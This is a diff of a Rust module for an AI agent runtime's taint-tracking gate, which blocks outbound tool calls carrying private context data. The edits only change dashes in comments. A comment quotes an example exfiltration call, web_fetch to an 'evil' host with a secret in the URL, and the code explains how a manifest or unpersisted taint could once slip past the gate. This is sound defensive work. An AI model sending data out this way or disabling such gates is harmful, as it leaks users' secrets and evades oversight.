@@ -3,7 +3,7 @@
 //! Every piece of data entering a context region carries a sensitivity tag.
 //! When an agent attempts an outbound action, the system checks whether
 //! the data flowing into that action exceeds the tool's clearance level.
-//! Taint levels are deterministic — set by the runtime based on tool
+//! Taint levels are deterministic - set by the runtime based on tool
 //! declarations and user policy, never by model output.
 
 use serde::{Deserialize, Serialize};
@@ -245,7 +245,7 @@ impl RegionTaint {
     /// Rebuild from a persisted list of per-entry taints.
     ///
     /// `current_level` is derived rather than stored, so a restored region ends
-    /// up at exactly the level its entries justify — and recovers as they evict,
+    /// up at exactly the level its entries justify - and recovers as they evict,
     /// the same as one that was never persisted.
     pub fn from_entry_taints(entry_taints: Vec<TaintLevel>) -> Self {
         let current_level = entry_taints
@@ -283,7 +283,7 @@ impl Default for SecurityConfig {
         // so the struct default is taint-on; a manifest with no block at all
         // yields `None`, which callers must resolve through
         // [`resolve_security`]/[`resolve_taint_enabled`] (default off). Do NOT
-        // use `unwrap_or_default()` on an optional agent/global config — that
+        // use `unwrap_or_default()` on an optional agent/global config - that
         // conflates "no block" with "empty block" and forces taint on
         // everywhere; cascade through the global setting instead.
         Self {
@@ -299,7 +299,7 @@ impl Default for SecurityConfig {
 /// agent configs come from `agent.leviath`, so if a manifest could set
 /// `taint_tracking = false` over a user's global `true`, installing an agent
 /// would be enough to disable the machine's data-flow enforcement. A manifest
-/// that wants tracking when the user has it off is still honored — that
+/// that wants tracking when the user has it off is still honored - that
 /// direction only tightens.
 pub fn resolve_taint_enabled(
     global: bool,
@@ -316,7 +316,7 @@ pub fn resolve_taint_enabled(
 /// present config (stage over agent), or a default whose `taint_tracking`
 /// follows the global toggle when neither level configures it.
 ///
-/// `taint_tracking` is clamped by [`resolve_taint_enabled`] so the two agree —
+/// `taint_tracking` is clamped by [`resolve_taint_enabled`] so the two agree -
 /// a manifest cannot disable what the user enabled.
 pub fn resolve_security(
     global: bool,
@@ -342,12 +342,12 @@ pub fn resolve_batch_tool_hint(global: bool, agent: Option<bool>, stage: Option<
     stage.or(agent).unwrap_or(global)
 }
 
-/// Result of a gate check — whether a tool invocation is allowed.
+/// Result of a gate check - whether a tool invocation is allowed.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub enum GateDecision {
-    /// Taint level is within clearance — proceed.
+    /// Taint level is within clearance - proceed.
     Allowed,
-    /// Taint level exceeds clearance — gate fires.
+    /// Taint level exceeds clearance - gate fires.
     Blocked {
         /// The taint level that caused the block.
         taint_level: TaintLevel,
@@ -402,9 +402,9 @@ pub struct GateEvent {
 /// How a gate decision was reached.
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 pub enum GateDecisionSource {
-    /// Taint was within clearance — automatic allow.
+    /// Taint was within clearance - automatic allow.
     AutoAllow,
-    /// Taint exceeded clearance — automatic block, before any user decision.
+    /// Taint exceeded clearance - automatic block, before any user decision.
     AutoBlock,
     /// Matched a static allowlist rule.
     AllowlistRule { rule_index: usize },
@@ -416,7 +416,7 @@ pub enum GateDecisionSource {
     UserAlwaysAllow,
     /// User denied the action.
     UserDenied,
-    /// Taint tracking is disabled — automatic allow.
+    /// Taint tracking is disabled - automatic allow.
     TaintDisabled,
     /// Auto-approved by `--yolo`: the gate would have blocked, but the agent
     /// runs unattended so enforcement is waived. Recorded (rather than silently
@@ -430,13 +430,13 @@ pub enum GateDecisionSource {
 /// this table decides what data-flow enforcement can see at all. It used to mark
 /// **only** `shell`/`bash` as outbound, which meant a Private-tainted context
 /// could be exfiltrated by `web_fetch("https://evil/?d=<secret>")` with taint
-/// tracking fully enabled — along with any MCP tool and any script tool, all of
+/// tracking fully enabled - along with any MCP tool and any script tool, all of
 /// which fell through to the internal/internal default and were never gated.
 ///
 /// Anything that can carry bytes off the machine is outbound now, and the
 /// fallback for an *unknown* tool is outbound too. An unrecognized tool is
-/// usually an MCP or script tool — third-party code reaching a third-party
-/// service — so treating it as internal was assuming the safest case about the
+/// usually an MCP or script tool - third-party code reaching a third-party
+/// service - so treating it as internal was assuming the safest case about the
 /// least-known code. Failing closed costs a prompt; failing open costs the data.
 pub fn builtin_tool_classification(tool_name: &str) -> ToolClassification {
     match tool_name {
@@ -489,8 +489,8 @@ pub fn builtin_tool_classification(tool_name: &str) -> ToolClassification {
         }
         // An unknown tool is almost always an MCP or Rhai script tool:
         // third-party code, usually talking to a third-party service. Treat it
-        // as outbound so the gate sees it. `ToolClassification::default()` —
-        // internal/internal — assumed the safest case about the least-known
+        // as outbound so the gate sees it. `ToolClassification::default()` -
+        // internal/internal - assumed the safest case about the least-known
         // code, and left every MCP and script tool ungated.
         _ => ToolClassification::new(
             TaintLevel::Public,
@@ -505,7 +505,7 @@ mod tests {
     use super::*;
 
     /// Taint was not persisted at all, so every restart, resume or page-in
-    /// brought a region back `Public` while the gate reported itself armed —
+    /// brought a region back `Public` while the gate reported itself armed -
     /// silently unblocking outbound tools it had been blocking.
     #[test]
     fn taint_rebuilds_from_persisted_entries_at_the_highest_level() {
@@ -948,7 +948,7 @@ mod tests {
         assert_eq!(tc.direction, ToolDirection::Internal);
     }
 
-    /// An unknown tool is almost always MCP or a Rhai script — third-party code
+    /// An unknown tool is almost always MCP or a Rhai script - third-party code
     /// talking to a third-party service. It fails closed. The old default was
     /// internal/internal, which assumed the safest case about the least-known
     /// code and left every MCP and script tool ungated.
@@ -992,9 +992,9 @@ mod tests {
 
     #[test]
     fn resolve_taint_enabled_agent_may_opt_in_but_not_out() {
-        // Global off, agent opts in — honored, that only tightens.
+        // Global off, agent opts in - honored, that only tightens.
         assert!(resolve_taint_enabled(false, Some(&sec(true)), None));
-        // Global on, agent tries to opt out — refused. `agent.leviath` is a
+        // Global on, agent tries to opt out - refused. `agent.leviath` is a
         // downloaded file; letting it disable the machine's data-flow
         // enforcement made taint tracking opt-out-by-installing-an-agent.
         assert!(resolve_taint_enabled(true, Some(&sec(false)), None));
@@ -1051,7 +1051,7 @@ mod tests {
         assert!(!resolve_security(false, None, None).taint_tracking);
         // Stage present → wins over agent for opting *in*.
         assert!(resolve_security(false, Some(&sec(false)), Some(&sec(true))).taint_tracking);
-        // An agent opt-out cannot beat the user's global on — `resolve_security`
+        // An agent opt-out cannot beat the user's global on - `resolve_security`
         // agrees with `resolve_taint_enabled` rather than disagreeing with it.
         assert!(resolve_security(true, Some(&sec(false)), None).taint_tracking);
     }
